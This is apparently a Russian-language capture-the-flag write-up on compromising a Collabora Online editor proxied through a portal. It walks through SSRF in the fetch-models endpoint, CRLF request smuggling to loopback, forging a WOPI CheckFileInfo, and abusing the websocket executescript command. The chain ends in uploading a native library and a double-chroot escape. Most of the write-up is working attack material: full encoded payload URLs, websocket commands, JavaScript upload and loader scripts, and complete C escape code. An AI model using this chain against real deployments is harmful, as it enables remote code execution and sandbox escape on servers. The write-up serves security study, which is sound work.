# Docus

Документ открывается не на портале, а во встроенном редакторе Collabora Online, и весь служебный трафик редактора по путям `/cool/*`, `/browser/*`, `/hosting/*` проксируется через сам портал. Учёток и документов при старте никаких нет, поэтому просто регистрируемся и осматриваемся. Первым делом всплывает версия, статика раздаётся по путям вида `/browser/<хэш сборки>/...`, а `/hosting/discovery` отдаёт манифест с полным номером. Версия свежая, 26.04.3.2.1. Портал это маленькое приложение без очевидных дыр, а вот редактор за прокси интересный. Скачиваем исходники ровно этой версии и читаем код, и уже при чтении кода становится видна вся цепочка, которую остаётся пройти.

Прежде чем идти вперёд, стоит понять, куда именно надо прийти, потому что флаг нельзя просто прочитать. Документы обрабатывают отдельные процессы, kit'ы, и каждый заперт в собственном chroot-джейле, копии каталога `/opt/cool/systemplate`. Флаг в эту копию не попадает, а всё чтение файлов, доступное из редактора, выполняется внутри джейла. До настоящего корня контейнера не дотянуться ничем, кроме нативного кода, запущенного прямо в kit-процессе. Значит надо добраться до выполнения своего кода в kit и устроить из него классический побег из chroot.

Точка входа находится быстро. У свежих сборок Collabora появился «ИИ-ассистент», и для него в `wsd/FileServer.cpp` есть обработчик эндпоинта `/browser/dist/fetch-models`, сервер сам скачивает настройки провайдера по адресу из параметра `baseUrl` и выдает ответ. Адрес разбирается функцией `AIUtil::buildAIEndpointUri` из `wsd/AIUtil.cpp`, она проверяет только схему и что хост не пустой, а сам GET уходит через обычную HTTP-сессию. Это готовый SSRF, но с ограничителем. Хост сверяется с allowlist'ом, который собирается из конфига и передаётся kit-процессам. Пробуем разные цели и видим, что запрос на адрес портала внутри docker-сети отклоняется, а на `http://localhost:9980` проходит. Collabora разрешает обращаться только к самой себе, через loopback. Смотрим дальше.

Уязвимость именно здесь, в том, как запрос отправляется. Из `baseUrl` разбирается URI, из него берутся хост и остаток, то есть путь вместе с query, и из этого собирается строка GET-запроса, причём CRLF никак не вырезаются. Poco::URI хранит компоненты в декодированном виде, а `http::Request` пишет path+query в стартовую строку как есть. Если в query лежат закодированные `%0D%0A`, после декодирования они снова станут настоящими переводами строк, и одна строка запроса превратится в несколько HTTP-запросов подряд на одном keep-alive соединении. Классический HTTP request smuggling, и запрет на запросы к другим хостам его не касается, хост для allowlist'а берётся из начала URL (`localhost`), а всё, что после `?`, отправляется в теле сгенерированного запроса нетронутым. Кладём в `baseUrl` два запроса к `http://localhost:9980`, до urlencoding они выглядят так:

```http
http://localhost:9980/cool/render-search-result?silent= HTTP/1.1
Host: localhost:9980
Content-Length: 0

POST /cool/convert-to/txt HTTP/1.1
Host: localhost:9980
Content-Type: multipart/form-data; boundary=----collabora-root-poc
Content-Length: 328
Connection: close

------collabora-root-poc
Content-Disposition: form-data; name="data"; filename="poc.txt"
Content-Type: text/plain

{"BaseFileName":"poc.txt","Size":0,"OwnerId":"poc","UserId":"poc","UserFriendlyName":"poc","UserCanWrite":true,"IsAnonymousUser":true,"FileUrl":"http://localhost:9980/robots.txt"}
------collabora-root-poc--
```

Первый запрос, безобидный `GET /cool/render-search-result` с нулевой длиной тела, просто занимает соединение, которое сервер открыл для фетча. Второй Collabora прочитает из того же сокета как следующий запрос. Это `POST /cool/convert-to/txt` с multipart-полем `data`. А в поле лежит не документ, а JSON CheckFileInfo, ответ WOPI-сервера с `UserCanWrite: true` и `FileUrl: http://localhost:9980/robots.txt`. Конвертеру всё равно, что превращать txt в txt бессмысленно, он честно возвращает содержимое поля телом ответа, а `fetch-models` показывает его нам. Вот зачем всё это было нужно. В исходниках, в `wsd/wopi/WopiStorage.cpp`, есть факт, который связывает все шаги. При скачивании документа метод GetFile предпочитает `FileUrl` из CheckFileInfo, WOPI-серверу доверяют полностью. Значит наш JSON, который сервер только что вернул сам себе, при загрузке документа станет для него настоящим CheckFileInfo, права `UserCanWrite: true` он возьмёт оттуда, а за содержимым сходит по `FileUrl`, то есть снова к самому себе. Так из ничего появляется «легальный» документ. Осталось упаковать весь smuggling в одну строку и передать эту строку Collabora как WOPISrc. В закодированном виде это готовый fetch-models URL, здесь `webapp:8000` адрес портала с точки зрения Collabora внутри docker-сети, у вас это будет хост и порт инстанса:

```text
http://webapp:8000/browser/dist/fetch-models?provider=custom&baseUrl=http%3A%2F%2Flocalhost%3A9980%2Fcool%2Frender-search-result%3Fsilent%3D+HTTP%2F1.1%0D%0AHost%3A+localhost%3A9980%0D%0AContent-Length%3A+0%0D%0A%0D%0APOST+%2Fcool%2Fconvert-to%2Ftxt+HTTP%2F1.1%0D%0AHost%3A+localhost%3A9980%0D%0AContent-Type%3A+multipart%2Fform-data%3B+boundary%3D----collabora-root-poc%0D%0AContent-Length%3A+328%0D%0AConnection%3A+close%0D%0A%0D%0A------collabora-root-poc%0D%0AContent-Disposition%3A+form-data%3B+name%3D%22data%22%3B+filename%3D%22poc.txt%22%0D%0AContent-Type%3A+text%2Fplain%0D%0A%0D%0A%7B%22BaseFileName%22%3A%22poc.txt%22%2C%22Size%22%3A0%2C%22OwnerId%22%3A%22poc%22%2C%22UserId%22%3A%22poc%22%2C%22UserFriendlyName%22%3A%22poc%22%2C%22UserCanWrite%22%3Atrue%2C%22IsAnonymousUser%22%3Atrue%2C%22FileUrl%22%3A%22http%3A%2F%2Flocalhost%3A9980%2Frobots.txt%22%7D%0D%0A------collabora-root-poc--%0D%0A&apiKey=poc
```

Открываем с этим «документом» обычный websocket-сеанс редактора. Строка целиком идёт в параметр WOPISrc адреса и кодируется дважды, иначе сервер развернёт её один раз и наши параметры распадутся.

```text
ws://webapp:8000/cool/ws?WOPISrc=http%253A%252F%252Fwebapp%253A8000%252Fbrowser%252Fdist%252Ffetch-models%253Fprovider%253Dcustom%2526baseUrl%253Dhttp%25253A%25252F%25252Flocalhost%25253A9980%25252Fcool%25252Frender-search-result%25253Fsilent%25253D%252BHTTP%25252F1.1%25250D%25250AHost%25253A%252Blocalhost%25253A9980%25250D%25250AContent-Length%25253A%252B0%25250D%25250A%25250D%25250APOST%252B%25252Fcool%25252Fconvert-to%25252Ftxt%252BHTTP%25252F1.1%25250D%25250AHost%25253A%252Blocalhost%25253A9980%25250D%25250AContent-Type%25253A%252Bmultipart%25252Fform-data%25253B%252Bboundary%25253D----collabora-root-poc%25250D%25250AContent-Length%25253A%252B328%25250D%25250AConnection%25253A%252Bclose%25250D%25250A%25250D%25250A------collabora-root-poc%25250D%25250AContent-Disposition%253A%252Bform-data%253B%252Bname%253D%252522data%252522%253B%252Bfilename%253D%252522poc.txt%252522%25250D%25250AContent-Type%253A%252Btext%25252Fplain%25250D%25250A%25250D%25250A%257B%2522BaseFileName%252522%253A%2522poc.txt%252522%25252C%2522Size%252522%253A0%25252C%252522OwnerId%252522%253A%2522poc%252522%25252C%252522UserId%252522%253A%2522poc%252522%25252C%252522UserFriendlyName%252522%253A%2522poc%252522%25252C%252522UserCanWrite%252522%253Atrue%25252C%252522IsAnonymousUser%252522%253Atrue%25252C%252522FileUrl%252522%253A%2522http%253A%252F%252Flocalhost%253A9980%252Frobots.txt%252522%257D%25250D%25250A------collabora-root-poc--%25250D%25250A%2526apiKey%253Dpoc&access_token=poc&permission=edit
```

Соединение установлено, теперь по сокету нужно отправить два сообщения. Сначала рукопожатие `coolclient 0.1`, затем загрузка, где тот же URL закодирован уже один раз. На команде `load` срабатывает всё, что мы подготовили раньше. Kit сходит по WOPISrc за CheckFileInfo, возьмёт оттуда наш JSON с правами на запись, содержимое скачает по FileUrl, и документ откроется:

```ws
coolclient 0.1
load url=http%3A%2F%2Fwebapp%3A8000%2Fbrowser%2Fdist%2Ffetch-models%3Fprovider%3Dcustom%26baseUrl%3Dhttp%253A%252F%252Flocalhost%253A9980%252Fcool%252Frender-search-result%253Fsilent%253D%2BHTTP%252F1.1%250D%250AHost%253A%2Blocalhost%253A9980%250D%250AContent-Length%253A%2B0%250D%250A%250D%250APOST%2B%252Fcool%252Fconvert-to%252Ftxt%2BHTTP%252F1.1%250D%250AHost%253A%2Blocalhost%253A9980%250D%250AContent-Type%253A%2Bmultipart%252Fform-data%253B%2Bboundary%253D----collabora-root-poc%250D%250AContent-Length%253A%2B328%250D%250AConnection%253A%2Bclose%250D%250A%250D%250A------collabora-root-poc%250D%250AContent-Disposition%253A%2Bform-data%253B%2Bname%253D%2522data%2522%253B%2Bfilename%253D%2522poc.txt%2522%250D%250AContent-Type%253A%2Btext%252Fplain%250D%250A%250D%250A%257B%2522BaseFileName%2522%253A%2522poc.txt%2522%252C%2522Size%2522%253A0%252C%2522OwnerId%2522%253A%2522poc%2522%252C%2522UserId%2522%253A%2522poc%2522%252C%2522UserFriendlyName%2522%253A%2522poc%2522%252C%2522UserCanWrite%2522%253Atrue%252C%2522IsAnonymousUser%2522%253Atrue%252C%2522FileUrl%2522%253A%2522http%253A%252F%252Flocalhost%253A9980%252Frobots.txt%2522%257D%250D%250A------collabora-root-poc--%250D%250A%26apiKey%3Dpoc
```

Документ открыт, но сам по себе он ничего не даёт, он был только предлогом попасть в этот websocket-сеанс. Важно, что сеанс не заканчивается на загрузке. Это тот же канал, по которому браузерный клиент редактора разговаривает с kit-процессом, и команды в нём это простые текстовые сообщения, как `coolclient 0.1` и `load url=...` выше. Отправлять их может кто угодно, серверу всё равно, настоящий ли это браузер. Дальше в дело вступает третья находка из исходников, `kit/ChildSession.cpp`. В списке команд, которые сессия принимает от клиента, числится `executescript`. Это внутренняя команда для расширений, она выполняет в kit-процессе произвольный JavaScript с полным доступом к UNO, внутреннему API LibreOffice, и возвращает результат строкой. Вспоминаем цель из второго абзаца и понимаем, куда мы попали. Код в kit уже выполняется, но это интерпретируемый JS, а выйти надо в настоящий корень контейнера, до которого из джейла достаёт только нативный код. Путь туда известный, через UNO, и все следующие шаги это тоже сообщения в тот же сокет, только с командой `executescript` и скриптом в теле. План такой. Сначала записываем в `/tmp` джейла нашу библиотеку `payload.so`, это обычный ELF, скомпилированный командой `gcc -shared -fPIC -o payload.so payload.c`, с экспортированной функцией `component_writeInfo`. Потом заставляем kit-процесс загрузить её через dlopen, и тогда эта функция выполнится уже как нативный код. Так что в скриптах ниже мы просто заливаем наш `.so` на диск джейла, чанки с base64 это куски именно этого файла. Сообщение вебсокета ограничено по размеру, поэтому файл уходит кусками по 28 килобайт, и в каждом скрипте едет собственный base64-декодер, потому что `writeBytes` принимает знаковые байты. Во всех скриптах подставлен условный nonce `0123456789abcdef0123456789abcdef`, сгодится любая hex-строка. Начинаем с очистки `/tmp` от прошлых попыток. Каждый скрипт отправляется сообщением вида `executescript <имя> <скрипт>`, а результат приходит в `executescriptresult`:

```js
(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),p=["file:///tmp/solve-0123456789abcdef0123456789abcdef-0","file:///tmp/solve-0123456789abcdef0123456789abcdef-1"].concat(["file:///tmp/solve-0123456789abcdef0123456789abcdef.so","file:///tmp/solve-0123456789abcdef0123456789abcdef.rdb","file:///tmp/solve-flag.txt"]);for(const x of p)try{if(s.exists(x))s.kill(x)}catch(e){}return 'OK'})()
```

Теперь `/tmp` чист, переходим к самой заливке. Скрипт ниже пишет первый кусок `payload.so`, остальные точно такие же и отличаются только номером в имени файла, а вместо `<base64 чанка .so>` подставляется base64 очередного куска:

```js
(()=>{const A='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';function d64(s){const o=[];for(let i=0;i<s.length;i+=4){const a=A.indexOf(s[i]),b=A.indexOf(s[i+1]),c=s[i+2]==='='?-1:A.indexOf(s[i+2]),d=s[i+3]==='='?-1:A.indexOf(s[i+3]);let v=(a<<2)|(b>>4);o.push(v<128?v:v-256);if(c>=0){v=((b&15)<<4)|(c>>2);o.push(v<128?v:v-256)}if(d>=0){v=((c&3)<<6)|d;o.push(v<128?v:v-256)}}return o}const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),o=s.openFileWrite("file:///tmp/solve-0123456789abcdef0123456789abcdef-0"),b=d64('<base64 чанка .so>');o.writeBytes(b);o.closeOutput();return String(b.length)})()
```

Когда записан последний кусок, в `/tmp` лежит столько файлов, сколько понадобилось для всего `payload.so`. Следующий скрипт читает их по очереди, склеивает в один файл и удаляет куски, оставляя только цельный `solve-<nonce>.so`:

```js
(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),o=s.openFileWrite("file:///tmp/solve-0123456789abcdef0123456789abcdef.so");let n=0;for(const p of ["file:///tmp/solve-0123456789abcdef0123456789abcdef-0","file:///tmp/solve-0123456789abcdef0123456789abcdef-1"]){const i=s.openFileRead(p),h={};i.readBytes(h,30000);i.closeInput();const b=Array.isArray(h.val)?h.val:[];o.writeBytes(b);n+=b.length;s.kill(p)}o.closeOutput();return String(n)})()
```

Теперь `payload.so` целиком лежит в джейле, и остался последний шаг, прыжок из интерпретатора в нативный код. В UNO есть штатный механизм загрузки компонентов, и именно он нам нужен. Библиотека `.so` с экспортом `component_writeInfo` загружается через `dlopen`, для этого достаточно вызвать `loader.SharedLibrary.writeRegistryInfo` с путём к файлу. Рядом создаётся пустой реестр SimpleRegistry, и вызов открывает нашу библиотеку, тот самый файл, собранный из чанков. Kit выполняет в ней `component_writeInfo` как нативный код. К моменту, когда скрипт ниже закончит работу, эта функция уже отработает и положит флаг в `/tmp/solve-flag.txt`, поэтому скрипт сразу читает его оттуда и возвращает нам строкой:

```js
(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext);let r=null,t='';try{r=uno.idl.com.sun.star.registry.SimpleRegistry.create(uno.componentContext);r.open("file:///tmp/solve-0123456789abcdef0123456789abcdef.rdb",false,true);const l=uno.idl.com.sun.star.loader.SharedLibrary.create(uno.componentContext);l.writeRegistryInfo(r.getRootKey(),'',"file:///tmp/solve-0123456789abcdef0123456789abcdef.so")}catch(e){t='load: '+String(e)}try{const i=s.openFileRead("file:///tmp/solve-flag.txt"),h={};i.readBytes(h,4096);i.closeInput();const b=Array.isArray(h.val)?h.val:[];t=b.map(v=>String.fromCharCode(v<0?v+256:v)).join('')}catch(e){}try{if(r&&r.isValid())r.destroy()}catch(e){}for(const p of ["file:///tmp/solve-0123456789abcdef0123456789abcdef.rdb","file:///tmp/solve-flag.txt","file:///tmp/solve-0123456789abcdef0123456789abcdef.so"])try{if(s.exists(p))s.kill(p)}catch(e){}return t})()
```

В ответ на этот скрипт приходит `executescriptresult` с флагом внутри, но чтобы понять, откуда он взялся, осталось разобраться, что делает сама `component_writeInfo` в нашем `payload.so` (полный код в `solve/payload.c`). Всё это ради цели из второго абзаца, побега из chroot. Точка входа открывает дескриптор каталога `/tmp` джейла и создаёт дочерний процесс. Родитель перед возвратом ждёт ребёнка через waitpid, иначе скрипт прочтёт маркер раньше, чем тот появится. Ребёнок делает классический двойной chroot. Создаёт каталог, делает chroot в него, поднимается наверх через `chdir("../../../../../../..")` и делает `chroot(".")`. После подъёма текущий каталог лежит уже вне джейла, и вторая смена корня запирает процесс в настоящем корне контейнера. Оттуда `/flag.txt` читается открытым текстом. Записать флаг обратно в джейл обычным путём нельзя, путей туда отсюда не видно, поэтому и нужен унаследованный дескриптор. fd переживает смену корня, и ответ пишется через `openat` прямо в `/tmp` джейла, где его уже ждёт скрипт загрузки. Круг замкнулся, флаг побывал в настоящем корне, а вернулся к нам тем же executescript-каналом, через который мы залили библиотеку:

```c
// solve/payload.c
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

static void escape_and_read(int jail_tmp_fd)
{
    if (mkdir("/.escape", 0755) != 0 && errno != EEXIST)
        _exit(1);
    if (chroot("/.escape") != 0)
        _exit(1);
    if (chdir("../../../../../../..") != 0)
        _exit(1);
    if (chroot(".") != 0)
        _exit(1);

    int flag = open("/flag.txt", O_RDONLY);
    if (flag < 0)
        _exit(1);
    char buf[256];
    int length = (int)read(flag, buf, sizeof(buf) - 1);
    close(flag);
    if (length <= 0)
        _exit(1);

    int out = openat(jail_tmp_fd, "solve-flag.txt", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (out < 0)
        _exit(1);
    write(out, buf, (size_t)length);
    close(out);
}

__attribute__((visibility("default"))) int component_writeInfo(void *a, void *b)
{
    (void)a;
    (void)b;
    int jail_tmp = open("/tmp", O_RDONLY | O_DIRECTORY);
    if (jail_tmp < 0)
        return 0;
    pid_t pid = fork();
    if (pid == 0) {
        escape_and_read(jail_tmp);
        _exit(0);
    }
    close(jail_tmp);
    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
    return pid > 0;
}
```
